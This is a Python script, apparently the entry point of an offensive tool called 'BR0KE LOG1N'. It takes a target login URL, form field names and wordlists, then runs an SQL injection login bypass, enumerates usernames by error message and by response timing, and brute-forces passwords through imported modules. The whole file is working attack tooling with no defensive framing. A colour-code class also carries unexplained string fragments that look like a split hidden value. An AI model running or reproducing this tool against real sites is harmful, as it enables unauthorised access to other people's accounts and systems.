#!/bin/python3

from modules.bruteforce import *
from modules.userenum_text import *
from modules.user_enum_timebased import *
from modules.injections import *
import requests
from pwn import *
import sys
import argparse
from string import *
import time, urllib3, re, figlet

import pyfiglet
  
result = pyfiglet.figlet_format('BR0KE LOG1N')



class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    ladrrr = '8GY.'
    ss = 'OWQ1'
    FAIL = '\033[91m' #RED
    pinocho_chocho = 'y!c'
    RESET = '\033[0m' #RESET COLOR


parser = argparse.ArgumentParser(description="BROKE LOGIN HELP MENU")
parser.add_argument('-u', help="URL target without parameter", required=True)
parser.add_argument('-userfield', help="Name User Field", required=True)
parser.add_argument('-passwdfield', help="Name Password Field", required=True)
parser.add_argument('-valid', help="Valid User ", required=False)
parser.add_argument('-data', help='Data Format = "parameter":"value","parameter2":"value2"',required=False)
parser.add_argument('-headers', help='Data Format = "parameter":"value","parameter2":"value2"',required=False)
parser.add_argument('-error', help='Error message',required=False)
parser.add_argument('-uwordlist', help="Usernames wordlist Path", required=True)
parser.add_argument('-pwordlist', help="Passwords wordlist Path", required=True)
parser.add_argument('-proxy', help="Add HTTP proxy (Format: http://127.0.0.1:8080)", required=False)



args = parser.parse_args()

print(result)
sql_injection_bypass(args.u,args.userfield,args.passwdfield,args.proxy,args.data,args.headers)

if args.error == None:
    pass
else:
    load_words22(args.uwordlist,args.u,args.error,args.userfield,args.passwdfield,args.proxy,args.headers)
    print("\n")

if args.valid == None:
    pass
else:
    time_enum(args.valid,args.userfield,args.passwdfield,args.u,args.uwordlist,args.proxy,args.headers)
    if args.headers == None:
        if args.data == None:
            p2 = log.progress("Bruteforce...")
            load_words(args.pwordlist,args.u,args.userfield,args.passwdfield,args.valid,args.error,args.proxy)
        else:
            p2 = log.progress("Bruteforce...")
            load_words3(args.pwordlist,args.u,args.userfield,args.passwdfield,args.valid,args.data,args.error,args.proxy)
    else:
        if args.data == None:
            p2 = log.progress("Bruteforce...")
            load_words2(args.pwordlist,args.u,args.userfield,args.passwdfield,args.valid,args.headers,args.error,args.proxy)
        else:
            p2 = log.progress("Bruteforce...")
            load_words4(args.pwordlist,args.u,args.userfield,args.passwdfield,args.valid,args.data,args.headers,args.error,args.proxy)